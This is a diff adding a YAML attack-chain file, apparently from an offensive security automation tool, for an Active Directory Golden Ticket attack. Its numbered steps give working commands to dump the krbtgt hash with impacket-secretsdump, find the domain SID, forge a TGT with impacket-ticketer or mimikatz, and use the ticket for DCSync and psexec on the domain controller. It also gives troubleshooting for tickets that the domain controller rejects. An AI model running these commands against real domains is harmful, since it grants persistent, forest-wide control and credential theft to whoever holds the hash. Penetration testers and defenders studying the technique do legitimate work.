@@ -1,0 +1,68 @@
+chain_id: golden_ticket
+title: "AD — Golden Ticket (forge any user, persist via krbtgt hash)"
+severity: CRITICAL
+tags: [ad, kerberos, golden-ticket, persistence, mimikatz, impacket, krbtgt]
+
+trigger:
+  any_of:
+    - { banner_pattern: "(?i)active\\s*directory|kerberos|domain\\s*controller" }
+    - { service_pattern: "(?i)kerberos" }
+    - { port_in: [88, 464] }
+    - { kind: "krbtgt_hash" }
+
+description: |
+  With the krbtgt account's NT hash (or AES key) you can forge an
+  arbitrary TGT for any principal in the domain — including SIDs from
+  trusted forests via SID History. Survives password resets of every
+  user except krbtgt itself; standard 10-year lifetime by default.
+  Owns the forest until krbtgt is rotated **twice**.
+
+steps:
+  - id: 1
+    title: "Get krbtgt hash (DCSync from a domain admin / SeBackup)"
+    command: |
+      impacket-secretsdump -just-dc-user 'krbtgt' \
+        -dc-ip $DC_IP DOMAIN/Administrator:'PASS'@$DC_IP
+
+  - id: 2
+    title: "Find the domain SID"
+    command: |
+      impacket-lookupsid DOMAIN/Administrator:'PASS'@$DC_IP 0 | head
+
+  - id: 3
+    title: "Forge with impacket"
+    command: |
+      impacket-ticketer -nthash <KRBTGT_NT> \
+        -domain-sid S-1-5-21-... -domain DOMAIN \
+        -spn '' Administrator
+      export KRB5CCNAME=Administrator.ccache
+
+  - id: 4
+    title: "Forge with mimikatz on a Windows foothold"
+    command: |
+      mimikatz "kerberos::golden /user:Administrator /domain:DOMAIN \
+        /sid:S-1-5-21-... /krbtgt:<KRBTGT_NT> /id:500 /ptt"
+      klist
+
+  - id: 5
+    title: "Use it — DCSync, psexec, anything"
+    command: |
+      impacket-secretsdump -k -no-pass DC.DOMAIN
+      impacket-psexec -k -no-pass DC.DOMAIN
+
+common_errors:
+  - error: "KRB_AP_ERR_MODIFIED on use"
+    solution: |
+      Wrong krbtgt key for the encryption type the forest enforces.
+      Pass `-aesKey` instead of `-nthash` (or vice versa). Check the
+      DC's `KrbtgtFullPacSignature` setting — newer KBs reject
+      tickets without enhanced PAC.
+  - error: "Ticket works once then is rejected"
+    solution: |
+      The DC just rotated krbtgt. You need two rotations to fully
+      invalidate forged tickets — if only one happened, the old hash
+      may still validate against the previous-key slot.
+
+references:
+  - https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/golden
+  - https://adsecurity.org/?p=1640
